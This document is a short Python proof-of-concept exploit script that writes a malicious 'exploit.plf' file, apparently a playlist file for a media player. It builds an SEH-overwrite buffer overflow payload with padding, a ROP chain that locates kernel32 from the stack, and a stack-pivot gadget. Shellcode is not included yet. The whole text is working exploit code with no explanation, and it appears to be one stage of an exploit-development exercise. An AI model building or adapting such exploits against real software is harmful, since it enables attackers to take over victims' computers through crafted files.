#!/usr/bin/env python
# PoC5.py
import struct

junk1 = "A"*304

# Get kernel32 address from the stack
rop = struct.pack('L',0x61618563) # XCHG EAX,EBP # RETN
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffff0d0) # Offset
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN
rop+= struct.pack('L',0x6163227d) # MOV EAX,DWORD PTR DS:[EAX] # RETN

junk2 = "C"*(612 - len(rop) - len(junk1))

seh = struct.pack('L',0x600148df) # ADD ESP,400 # RETN

payload = junk1 + rop + junk2 + seh

f = open('exploit.plf','w')
f.write(payload)
f.close()
